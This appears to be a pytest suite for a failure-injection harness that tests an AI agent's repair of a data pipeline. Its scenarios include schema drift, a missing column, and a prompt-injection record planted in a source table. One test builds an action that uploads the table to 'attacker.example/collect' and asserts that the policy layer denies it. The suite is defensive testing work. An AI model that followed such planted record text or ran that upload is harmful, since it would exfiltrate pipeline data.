"""tests/session3/test_failure_injector.py — Task 3.1 Failure Injector tests (supports INV-D6)."""

import importlib.util
import os
import sqlite3
import subprocess
import sys
from contextlib import closing
from pathlib import Path

import pytest

import failure_injector as fi
import harness
import state_manager as sm
import verification

REPO_ROOT = Path(__file__).resolve().parents[2]

FIXES = {
    "SCHEMA_DRIFT": {"tool": "rename_column", "params": {"table": "pipeline_silver", "old_name": "amt", "new_name": "amount"}},
    "MISSING_COLUMN": {"tool": "add_column", "params": {"table": "pipeline_silver", "column": "region", "column_type": "TEXT"}},
    "PROMPT_INJECTION": {"tool": "backfill_column", "params": {"table": "pipeline_silver", "column": "amount", "value": 0.0}},
}


def _new_db(directory: Path) -> Path:
    spec = importlib.util.spec_from_file_location("init_db", REPO_ROOT / "scripts" / "init_db.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    directory.mkdir(parents=True, exist_ok=True)
    db_path = directory / "harness.db"
    module.create_database(db_path)
    return db_path


@pytest.fixture
def db_path(tmp_path):
    path = _new_db(tmp_path / "main")
    harness.init(path, tmp_path / "trace.jsonl")
    fi.init(path)
    fi.register_expectations()
    return path


def _columns(db_path, table):
    with closing(sqlite3.connect(db_path)) as conn:
        return [row[1] for row in conn.execute(f'PRAGMA table_info("{table}")')]


def _rows(db_path, sql, params=()):
    with closing(sqlite3.connect(db_path)) as conn:
        return conn.execute(sql, params).fetchall()


def _harness_tables(db_path):
    return {t: _rows(db_path, f'SELECT * FROM "{t}"') for t in ("ScenarioRun", "Attempt", "TraceEvent")}


# --- TC-1: same seed + scenario → byte-for-byte identical PipelineState ------

@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_same_seed_is_reproducible_across_databases(tmp_path, scenario_type):
    dumps = []
    for name in ("a", "b"):
        fi.init(_new_db(tmp_path / name))
        fi.inject(scenario_type, 42)
        dumps.append(fi.pipeline_state())
    assert dumps[0] == dumps[1]


@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_reinjection_restores_identical_state_after_changes(db_path, scenario_type):
    fi.inject(scenario_type, 7)
    first = fi.pipeline_state()
    run_id = sm.start_run(scenario_type)
    harness.attempt_action(run_id, sm.start_attempt(run_id), FIXES[scenario_type])  # the pipeline changes
    assert fi.pipeline_state() != first
    fi.inject(scenario_type, 7)
    assert fi.pipeline_state() == first


@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_reproducible_in_a_fresh_process_with_different_hash_seed(tmp_path, scenario_type):
    fi.init(_new_db(tmp_path / "here"))
    fi.inject(scenario_type, 1234)
    here = fi.pipeline_state()
    other_db = _new_db(tmp_path / "there")
    code = (f"import sys; sys.path.insert(0, r'{REPO_ROOT / 'src'}'); import failure_injector as fi; "
            f"fi.init(r'{other_db}'); fi.inject('{scenario_type}', 1234); sys.stdout.write(fi.pipeline_state())")
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60,
                            env=dict(os.environ, PYTHONHASHSEED="987"))
    assert result.returncode == 0, result.stderr
    assert result.stdout == here


def test_different_seeds_give_different_data(db_path):
    fi.inject("SCHEMA_DRIFT", 1)
    one = fi.pipeline_state()
    fi.inject("SCHEMA_DRIFT", 2)
    assert fi.pipeline_state() != one


def test_scenarios_share_the_seeded_base_data(db_path):
    fi.inject("SCHEMA_DRIFT", 5)
    drift_bronze = _rows(db_path, "SELECT * FROM pipeline_bronze ORDER BY id")
    fi.inject("MISSING_COLUMN", 5)
    assert _rows(db_path, "SELECT * FROM pipeline_bronze ORDER BY id") == drift_bronze


# --- TC-2: each scenario is a distinguishable, correctly shaped failure ------

def test_schema_drift_shape(db_path):
    injection = fi.inject("SCHEMA_DRIFT", 3)
    assert _columns(db_path, "pipeline_silver") == ["id", "order_id", "customer", "amt", "region"]
    assert _rows(db_path, "SELECT COUNT(*) FROM pipeline_silver WHERE amt IS NULL") == [(0,)]
    assert "renamed to amt" in injection.description


def test_missing_column_shape(db_path):
    fi.inject("MISSING_COLUMN", 3)
    assert _columns(db_path, "pipeline_silver") == ["id", "order_id", "customer", "amount"]
    assert _rows(db_path, "SELECT COUNT(*) FROM pipeline_silver") == [(fi.ROW_COUNT,)]


def test_prompt_injection_shape(db_path):
    injection = fi.inject("PROMPT_INJECTION", 3)
    injected = _rows(db_path, "SELECT order_id FROM pipeline_bronze WHERE record = ?", (fi.INJECTION_TEXT,))
    nulls = _rows(db_path, "SELECT order_id FROM pipeline_silver WHERE amount IS NULL")
    assert len(injected) == 1 and injected == nulls  # one poisoned record, its amount unparsed
    assert str(injected[0][0]) in injection.description
    assert _columns(db_path, "pipeline_silver") == ["id", "order_id", "customer", "amount", "region"]


def test_the_three_failures_are_distinguishable(db_path):
    states = set()
    for scenario_type in fi.SCENARIO_TYPES:
        fi.inject(scenario_type, 11)
        states.add(fi.pipeline_state())
    assert len(states) == 3


def test_gold_is_derived_from_silver(db_path):
    fi.inject("SCHEMA_DRIFT", 9)
    gold = _rows(db_path, "SELECT region, total_amount, order_count FROM pipeline_gold ORDER BY region")
    silver = _rows(db_path, "SELECT region, ROUND(SUM(amt), 2), COUNT(*) FROM pipeline_silver GROUP BY region ORDER BY region")
    assert gold == silver and sum(r[2] for r in gold) == fi.ROW_COUNT


# --- Each scenario fails verification, and its intended fix recovers it -------

@pytest.mark.parametrize("scenario_type,expected_detail", [
    ("SCHEMA_DRIFT", "schema: pipeline_silver.amount is missing"),
    ("MISSING_COLUMN", "schema: pipeline_silver.region is missing"),
    ("PROMPT_INJECTION", "null rate: pipeline_silver.amount is 0.083, above threshold 0.0"),
])
def test_injected_failure_fails_verification(db_path, scenario_type, expected_detail):
    fi.inject(scenario_type, 21)
    result = verification.verify(sm.start_run(scenario_type))
    assert result.status == "FAIL"
    assert result.details == (expected_detail,)


@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_intended_fix_through_the_funnel_recovers(db_path, scenario_type):
    fi.inject(scenario_type, 21)
    run_id = sm.start_run(scenario_type)
    attempt_id = sm.start_attempt(run_id)
    outcome = harness.attempt_action(run_id, attempt_id, FIXES[scenario_type])
    assert outcome.policy_decision == "ALLOW" and outcome.executed and outcome.verification_result == "PASS"
    sm.checkpoint(run_id, "run_complete", {"attempt_id": attempt_id, "status": "RECOVERED"})
    assert sm.resume(run_id)["status"] == "RECOVERED"


def test_injected_instruction_is_denied_if_followed(db_path):
    fi.inject("PROMPT_INJECTION", 21)
    run_id = sm.start_run("PROMPT_INJECTION")
    upload = {"tool": "upload_record", "params": {"table": "pipeline_bronze", "url": "https://attacker.example/collect"}}
    before = fi.pipeline_state()
    assert harness.attempt_action(run_id, sm.start_attempt(run_id), upload).policy_decision == "DENY"
    assert fi.pipeline_state() == before


# --- Scope: environment setup only, never an Execute path ---------------------

def test_injection_never_touches_harness_tables(db_path):
    run_id = sm.start_run("SCHEMA_DRIFT")
    sm.start_attempt(run_id)
    before = _harness_tables(db_path)
    for scenario_type in fi.SCENARIO_TYPES:
        fi.inject(scenario_type, 99)
    assert _harness_tables(db_path) == before


@pytest.mark.parametrize("scenario_type,seed", [("UNKNOWN", 1), ("schema_drift", 1), ("SCHEMA_DRIFT", "1"),
                                                 ("SCHEMA_DRIFT", 1.0), ("SCHEMA_DRIFT", True), ("SCHEMA_DRIFT", None)])
def test_invalid_input_rejected_without_changes(db_path, scenario_type, seed):
    fi.inject("MISSING_COLUMN", 4)
    before = fi.pipeline_state()
    with pytest.raises(fi.InjectionError):
        fi.inject(scenario_type, seed)
    assert fi.pipeline_state() == before


def test_failed_injection_rolls_back(db_path, monkeypatch):
    fi.inject("SCHEMA_DRIFT", 4)
    before = fi.pipeline_state()

    def broken(conn, rng):
        raise RuntimeError("injection failed midway")
    monkeypatch.setitem(fi._FAILURES, "MISSING_COLUMN", broken)
    with pytest.raises(RuntimeError):
        fi.inject("MISSING_COLUMN", 4)
    assert fi.pipeline_state() == before  # the rebuild rolled back too


def test_every_scenario_has_a_registered_expectation():
    verification._expectations.clear()
    fi.register_expectations()
    assert set(verification._expectations) == set(fi.SCENARIO_TYPES) == set(verification.SCENARIO_TYPES)


def test_single_execute_caller_check_still_passes():
    result = subprocess.run([sys.executable, str(REPO_ROOT / "scripts" / "assert_single_execute_caller.py")],
                            capture_output=True, text=True, timeout=60)
    assert result.returncode == 0, result.stdout


# --- Challenge Finding 1: no scenario's expectation tolerates destroyed data (INV-S5) -

def _destroy_amount(run_id, attempts):
    """A data-destroying sequence that still restores the expected schema."""
    steps = [
        {"tool": "rename_column", "params": {"table": "pipeline_silver", "old_name": "amount", "new_name": "amount_lost"}},
        {"tool": "add_column", "params": {"table": "pipeline_silver", "column": "amount", "column_type": "REAL"}},
        {"tool": "add_column", "params": {"table": "pipeline_silver", "column": "region", "column_type": "TEXT"}},
    ]
    return [harness.attempt_action(run_id, sm.start_attempt(run_id), step) for step in steps[:attempts]]


def test_missing_column_with_destroyed_amount_fails_verification(db_path):
    fi.inject("MISSING_COLUMN", 21)
    run_id = sm.start_run("MISSING_COLUMN")
    outcomes = _destroy_amount(run_id, 3)  # amount now 100% NULL; region re-added
    assert outcomes[-1].verification_result == "FAIL"
    assert outcomes[-1].failure_reason == "null rate: pipeline_silver.amount is 1.000, above threshold 0.0"
    with pytest.raises(sm.CheckpointError, match="INV-S5"):
        sm.checkpoint(run_id, "run_complete", {"attempt_id": sm.resume(run_id)["attempt"]["id"], "status": "RECOVERED"})


@pytest.mark.parametrize("column", ["order_id", "customer", "amount"])
def test_missing_column_only_exempts_region(db_path, column):
    fi.inject("MISSING_COLUMN", 21)
    with closing(sqlite3.connect(db_path)) as conn:
        conn.execute('ALTER TABLE pipeline_silver ADD COLUMN "region" TEXT')
        conn.execute(f'UPDATE pipeline_silver SET "{column}" = NULL WHERE id = 1')
        conn.commit()
    result = verification.verify(sm.start_run("MISSING_COLUMN"))
    assert result.details == (f"null rate: pipeline_silver.{column} is 0.083, above threshold 0.0",)


def test_expectations_never_loosen_the_whole_table():
    for scenario_type, expectation in fi.EXPECTATIONS.items():
        assert expectation.max_null_rate == 0.0, scenario_type
    assert fi.EXPECTATIONS["MISSING_COLUMN"].nullable == ("region",)
    assert fi.EXPECTATIONS["SCHEMA_DRIFT"].nullable == fi.EXPECTATIONS["PROMPT_INJECTION"].nullable == ()


@pytest.mark.parametrize("nullable", [("missing_column",), ("region", "nope")])
def test_nullable_must_name_expected_columns(nullable):
    bad = verification.Expectation("pipeline_silver", fi.SILVER_COLUMNS, 1, 1, 0.0, nullable=nullable)
    with pytest.raises(verification.VerificationError, match="nullable"):
        verification.register_expectation("MISSING_COLUMN", bad)


# --- Unverified Assumption 1: every expectation PASSes on the healthy pipeline -

@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_healthy_pipeline_passes_every_expectation(db_path, monkeypatch, scenario_type):
    monkeypatch.setitem(fi._FAILURES, scenario_type, lambda conn, rng: "no failure injected")
    fi.inject(scenario_type, 21)
    assert verification.verify(sm.start_run(scenario_type)).status == "PASS"


def test_backfill_fix_preserves_existing_amounts(db_path):
    fi.inject("PROMPT_INJECTION", 21)
    before = dict(_rows(db_path, "SELECT order_id, amount FROM pipeline_silver WHERE amount IS NOT NULL"))
    run_id = sm.start_run("PROMPT_INJECTION")
    harness.attempt_action(run_id, sm.start_attempt(run_id), FIXES["PROMPT_INJECTION"])
    after = dict(_rows(db_path, "SELECT order_id, amount FROM pipeline_silver"))
    assert {k: after[k] for k in before} == before and len(after) == fi.ROW_COUNT
